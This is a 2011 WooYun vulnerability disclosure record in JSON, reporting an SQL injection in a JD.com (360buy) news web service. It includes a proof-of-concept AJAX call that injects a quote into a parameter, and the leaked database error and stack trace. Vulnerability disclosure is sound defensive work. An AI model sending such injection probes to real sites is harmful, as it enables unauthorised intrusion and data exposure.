{"id": 23084, "wybug_id": "wooyun-2011-01860", "wybug_title": "京东商城SQL注入BUG", "wybug_corp": "京东商城", "wybug_author": "Jannock", "wybug_date": "2011-04-10 23:44", "wybug_open_date": "2011-04-16 00:00", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "未屏蔽错误信息"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-04-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-04-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 发现京东商城SQL注入，但好像过滤得比较严重，也没详细研究，定为BUG吧！ 详细说明：  http://www.360buy.com/newsserver.asmx?op=Getnewtype 参数存在SQL注入。   漏洞证明：  http://www.360buy.com/newsserver.asmxfireBug 下$.jmsajax(\t{\t\turl: \"newsserver.asmx\",\t\tmethod: \"Getnew\",\t\tdata:\t\t{\t\t type:'ss\\'',\t\t\tnum:3\t\t},\t\tsuccess: function(data)\t\t{ \t\t\talert(data);\t\t}\t});http://www.360buy.com/newsserver.asmx/Getnew{\"Message\":\"列名 \\u0027ss\\u0027 无效。\",\"StackTrace\":\"   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)\\r\\n   在 System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection)\\r\\n   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj)\\r\\n   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)\\r\\n   在 System.Data.SqlClient.SqlDataReader.ConsumeMetaData()\\r\\n   在 System.Data.SqlClient.SqlDataReader.get_MetaData()\\r\\n   在 System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)\\r\\n   在 System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)\\r\\n   在 System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)\\r\\n   在 System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)\\r\\n   在 System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)\\r\\n   在 System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior)\\r\\n   在 Web2008.CatalogSystem.Dao.SqlHelper.ExecuteReader(String connectionString, CommandType cmdType, String cmdText, SqlParameter[] commandParameters) 位置 D:\\\\workspace\\\\www.360buy.com\\\\Web2008.CatalogSystem\\\\Dao\\\\SQLHelper.cs:行号 129\\r\\n   在 Web2008.CatalogSystem.Dao.CatalogDao.getnewslist(String type, String type2, Int32 num) 位置 D:\\\\workspace\\\\www.360buy.com\\\\Web2008.CatalogSystem\\\\Dao\\\\CatalogDao.cs:行号 633\\r\\n   在 Web2008.CatalogSystem.Service.CacheCatalogProvider.getnewslist(String type, String type2, Int32 num) 位置 D:\\\\workspace\\\\www.360buy.com\\\\Web2008.CatalogSystem\\\\Service\\\\CacheCatalogProvider.cs:行号 233\\r\\n   在 Web2008.UISystem.news.getnew(String type, String type2, Int32 num, String keys) 位置 D:\\\\workspace\\\\www.360buy.com\\\\Web2008.UISystem\\\\news.cs:行号 218\\r\\n   在 Web2008.UISystem.news.getnew(String type, String type2, Int32 num) 位置 D:\\\\workspace\\\\www.360buy.com\\\\Web2008.UISystem\\\\news.cs:行号 184\\r\\n   在 newsserver.Getnew(String type, Int32 num) 位置 d:\\\\workspace\\\\www.360buy.com\\\\www.360buy.com\\\\360buy.comWeb\\\\App_Code\\\\newsserver.cs:行号 70\",\"ExceptionType\":\"System.Data.SqlClient.SqlException\"}\n\n   修复方案：  您懂得！   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2011-04-16 00:00 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-04-11 14:25 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  等待内容公开    \n     2012-05-12 22:54 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  京东.....不想说脏话.    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}